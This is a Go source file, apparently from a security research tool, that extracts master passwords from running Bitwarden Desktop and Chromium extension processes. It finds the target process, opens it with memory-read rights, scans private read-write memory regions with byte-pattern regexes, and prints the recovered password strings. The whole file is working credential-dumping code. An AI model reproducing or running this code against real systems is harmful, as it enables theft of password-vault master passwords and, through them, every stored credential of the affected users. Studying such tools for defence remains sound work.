package main

import (
	"bytes"
	"fmt"
	"regexp"
	"strings"
	"syscall"
	"unicode"

	"github.com/0xrawsec/golang-win32/win32"
	"github.com/0xrawsec/golang-win32/win32/kernel32"
	"github.com/shirou/gopsutil/v3/process"
)

// Original font pattern
// f.o.n.t.-.f.a.c.e.
var chromiumExtFontPattern = []byte{0x66, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x2d, 0x00, 0x66, 0x00, 0x61, 0x00, 0x63, 0x00, 0x65, 0x00}
var desktopAppFontPattern = []byte{0x2f, 0x66, 0x6f, 0x6e, 0x74, 0x73, 0x2f, 0x4f, 0x70, 0x65, 0x6e, 0x5f, 0x53, 0x61, 0x6e, 0x73, 0x2d, 0x6e, 0x6f, 0x72, 0x6d, 0x61, 0x6c, 0x2d, 0x38, 0x30, 0x30, 0x2e, 0x77, 0x6f, 0x66, 0x66}
var desktopAppCSSPattern = []byte{0x6c, 0x32, 0x2d, 0x70, 0x6f, 0x70, 0x75, 0x70, 0x2e, 0x73, 0x77, 0x61, 0x6c, 0x32, 0x2d, 0x74, 0x6f, 0x61, 0x73, 0x74, 0x7b, 0x66, 0x6c, 0x65, 0x78, 0x2d, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x63, 0x6f, 0x6c, 0x75, 0x6d, 0x6e, 0x3b, 0x61, 0x6c, 0x69, 0x67, 0x6e}
var testingPattern = []byte{0x7b, 0x22, 0x61, 0x63, 0x63, 0x65, 0x73, 0x73, 0x5f, 0x74, 0x6f, 0x6b, 0x65, 0x6e, 0x22, 0x3a}

func getFilteredProcs(procList []*process.Process) ([]*targetProc, error) {
	// Create empty slice of struct pointers.
	allFilteredProcesses := []*targetProc{}

	for i := range procList {

		pid := procList[i].Pid
		exeName, _ := procList[i].Name()
		cmdLine, _ := procList[i].Cmdline()

		// Find process with specific exeName and specific child process (cmdLine)
		if exeName == BWDesktopEXEName && strings.Contains(cmdLine, BWDesktopCmdLine) {
			// Create struct and append it to the slice.
			p := new(targetProc)
			p.pidInt = pid
			p.exeName = exeName
			p.cmdLine = cmdLine
			// Append to emtpy slice
			allFilteredProcesses = append(allFilteredProcesses, p)
		}
	}

	if len(allFilteredProcesses) == 0 {
		return nil, fmt.Errorf("[!] Target process list emtpy!")
	}

	return allFilteredProcesses, nil
}

func searchProcessMemory(pid int, exe string) ([][]*resultStrings, error) {

	memStrings := [][]*resultStrings{}

	// Open the process with appropriate access rights
	da := uint32(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION)
	hProcess, err := syscall.OpenProcess(da, false, uint32(pid))
	if err != nil {
		return nil, err
	}
	defer kernel32.CloseHandle(win32.HANDLE(hProcess))

	fmt.Printf("[+] Searching PID memory (%d)\n", pid)

	// Search all accessible memory regions within process
	for mbi := range kernel32.AllVirtualQueryEx(win32.HANDLE(hProcess)) {
		// Filter by type, state, protection and regionsize
		// Docs: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information
		if mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE && mbi.RegionSize < (1<<25) {
			// Bitwarden Desktop RegionSize: 0x14000
			// Bitwarden Chrome RegionSize: < (1 << 25)
			mem := make([]byte, mbi.RegionSize)
			lpAddress := win32.LPCVOID(mbi.BaseAddress)
			kernel32.ReadProcessMemory(win32.HANDLE(hProcess), lpAddress, mem)

			// Search for patterns in each memory region
			memRegionStrings := getBWDesktopByteStrings(pid, mem, mbi)
			if len(memRegionStrings) > 0 {
				// Append everything to slice
				memStrings = append(memStrings, memRegionStrings)
			}

			/*
				if exe == BWDesktopEXEName {
					memRegionStrings := getBWDesktopByteStrings(pid, mem, mbi)
					// Append everything to slice
					memStrings = append(memStrings, memRegionStrings)

					// Only works on older Chrome web browsers
					//} else {
					//	searchChromiumBytePattern(pid, mem, mbi)
				}
			*/
		}
	}
	return memStrings, nil
}

func getBWDesktopByteStrings(pid int, mem []byte, mbi win32.MemoryBasicInformation) []*resultStrings {

	// Check if known bytes exsits within memory region
	//if bytes.Contains(mem, desktopAppFontPattern) || bytes.Contains(mem, desktopAppCSSPattern) || bytes.Contains(mem, testingPattern) {
	out := []*resultStrings{}

	// Uses a regex pattern to find strings (only ASCII characters)
	// Note: when submitting a password with copy and paste, forces the
	// app to store the password using Windows UTF-16 (includes 0x00)
	r, err := regexp.Compile(BWDesktopRegexBytePattern)
	if err != nil {
		fmt.Printf("[!] Offset not found")
	}

	// Finds only the first occurance
	//patternOffsetAddr := r.FindIndex(mem)

	// Finds multiple occurances
	patternOffsetAddrBetter := r.FindAllIndex(mem, -1) // -1 specifies the end of object/bytes

	//fmt.Printf("[+] Offset: (0x%x)\n", passOffset)
	if len(patternOffsetAddrBetter) != 0 {
		fmt.Printf("[+] Found initial pattern\n")
		fmt.Printf("[+] Memory region: 0x%x - 0x%x\n", mbi.BaseAddress, mbi.BaseAddress+mbi.RegionSize)
		fmt.Printf("[+] Region size: 0x%x\n", mbi.RegionSize)
		// Print the number of hits
		fmt.Printf("[+] No. of hits: %d \n\n", len(patternOffsetAddrBetter))

		for i, val := range patternOffsetAddrBetter {
			//fmt.Printf("Index: %d = %x\n", i, v[0])
			str := bytes.NewBuffer(mem[val[0]+4 : val[1]]).String() // start after the password prefix
			isDefaultStr := false

			for _, str2 := range StaticBWStrings {
				// Exclude known Bitwarden strings
				if strings.Contains(str, str2) {
					isDefaultStr = true
					break
				}
			}

			if isDefaultStr {
				continue
			}
			if verboseOption {
				fmt.Printf("%s\n", str) // show all the strings matched
			}

			item := new(resultStrings)
			item.memRegion = uint64(mbi.BaseAddress)
			item.memSize = int32(mbi.RegionSize)
			item.index = i
			item.startOffset = val[0]
			item.endOffset = val[1]
			item.str = str

			out = append(out, item)
			//fmt.Printf("Index: %d with Offset: 0x%x = %s\n", i, v[0], str3)

		}

		return out

	}

	return nil

}

// Dead code
func searchChromiumBytePattern(pid int, mem []byte, mbi win32.MemoryBasicInformation) {

	if bytes.Contains(mem, chromiumExtFontPattern) {

		fmt.Printf("[+] Found pattern at MemBaseAddr (0x%x)\n", mbi.BaseAddress)

		// Write memory regions to a file
		if dumpMemoryOption {
			writeMemoryRegions(pid, mbi.BaseAddress, mem)
		}

		// Search for password prefix pattern: 04 00 00 00 ?? 00 00 00 01
		r, err := regexp.Compile(BWChromeRegexBytePattern)
		if err != nil {
			fmt.Printf("[!] Offset not found")
		}

		patternOffsetAddr := r.FindIndex(mem)

		if len(patternOffsetAddr) != 0 {
			// Extract password length and offset
			// Pattern: 04 00 00 00 XX 00 00 00 01
			passLenOffset := patternOffsetAddr[0] + 4
			passOffset := patternOffsetAddr[0] + 12
			passLen := mem[passLenOffset]

			str := bytes.NewBuffer(mem[passOffset : passOffset+int(passLen)]).String()

			fmt.Printf("[+] Found password prefix bytes at offset (0x%04x)\n", patternOffsetAddr[0])
			fmt.Printf("[+] Found password length (0x%02x) or %d characters\n", passLen, passLen)

			// Bitwarden web registeration has a minimum 8 characters
			// for master password and filter out non-ASCII characters
			if passLen >= 8 && isASCII(str) {

				fmt.Printf("[+] Password: %s\n\n", str)
			} else {
				fmt.Printf("[!] Contains non-ASCII characters, skipping...\n\n")
			}

		} else {
			fmt.Printf("[!] Password not found :(\n\n")
		}

	}
}

// Source: https://stackoverflow.com/questions/53069040/checking-a-string-contains-only-ascii-characters
func isASCII(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] > unicode.MaxASCII {
			return false
		}
	}
	return true
}
